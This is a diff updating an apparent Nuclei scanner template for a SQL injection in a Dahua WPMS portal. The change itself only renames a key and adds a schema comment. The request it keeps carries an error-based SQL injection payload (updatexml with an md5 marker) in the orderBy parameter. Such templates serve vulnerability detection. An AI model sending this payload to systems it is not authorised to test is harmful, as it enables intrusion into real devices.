@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: WPMS-sqli
 
 info:
@@ -6,7 +7,7 @@ info:
   severity: high
   tags: dahua
 
-requests:
+http:
   - raw:
       - |
         GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B"orderBy":"1%20and%201=updatexml(1,concat(0x7e,(select%20md5(10086)),0x7e),1)--"%7D/extend/%7B%7D HTTP/1.1
